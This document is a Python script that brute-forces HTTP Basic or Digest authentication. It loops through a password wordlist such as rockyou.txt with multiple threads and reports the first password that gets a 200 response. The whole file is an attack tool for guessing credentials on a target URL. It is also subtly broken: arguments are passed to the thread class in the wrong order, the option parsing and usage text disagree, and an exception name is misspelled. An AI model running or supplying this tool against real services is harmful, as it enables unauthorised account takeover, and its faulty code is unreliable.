#!/usr/bin/env python3

import requests
from threading import Thread
import sys
import time
import getopt
from requests.auth import HTTPDigestAuth

global hit 

hit = "1"

def banner():
	print("-----" * 5)
	print("Base or Digest Auth")
	print("-----" * 5)

def usage():
	print("Usage: -u <URL> -U <USERNAME> -t <NUMBER OF THREADS> -w <WORDLISTS> -m <METHOD (Base or Digest)>")
	print("Example: python3 baseDigestAuth.py -w http://localhost/ -u admin -t 5 -f rockyou.txt -m basic")

class request_performer(Thread):
	def __init__(self, user, passwd, url, method):
		Thread.__init__(self)
		self.user = user
		self.password = passwd.split("\n")[0]
		self.url = url
		self.method = method
		print("- {} -".format(self.password))

	def run(self):
		global hit 

		if hit == "1":
			try:
				if self.method == "basic":
					r = requests.get(self.url, auth=(self.user, self.password))
				elif self.method == "digest":
					r = requests.get(self.url, auth=HTTPDigestAuth(self.user, self.password))

				if r.status_code == 200:
					hit = "0"
					print("[+] Password found: {}".format(self.password))
					sys.exit()
				else:
					print("[-] Invalid password: {}".format(self.password))
					i[0] = i[0] - 1
			except Exception as e:
				print(e)

def start(argv):
	banner()
	if len(sys.argv) < 5:
		usage()
		sys.exit()

	try:
		opts, args = getopt.getopt(argv, "u:U:t:w:m")
	except getopt.Getopterror:
		print("[-] Invalid arguments")
		sys.exit()

	method = ""
	user = ""
	url = ""
	threads = 0

	for opt, arg in opts:
		if opt == "-u":
			url = arg
		elif opt == "-U":
			user = arg
		elif opt == "-t":
			threads = arg 
		elif opt == "-w":
			wordlist = arg 
		elif opt == "-m":
			method = arg 

	try:
		f = open(wordlist, "r")
		passwords = f.readlines()
	except:
		print("[-] Error. File does not exist")
		sys.exit()

	launchThreads(passwords, threads, user, url, method)

def launchThreads(passwords, threads, user, url, method):
	global i

	i = []
	i.append(0)

	while len(passwords):
		if hit == "1":
			try:
				if i[0] < int(threads):
					password = passwords.pop(0)
					i[0] = i[0] + 1
					thread = request_performer(password, user, url, method)
					thread.start()
			except KeyboardInterrupt:
				print("Program Interrupted")
				sys.exit()
			thread.join()

if __name__ == "__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print("[-] Program Interrupted")

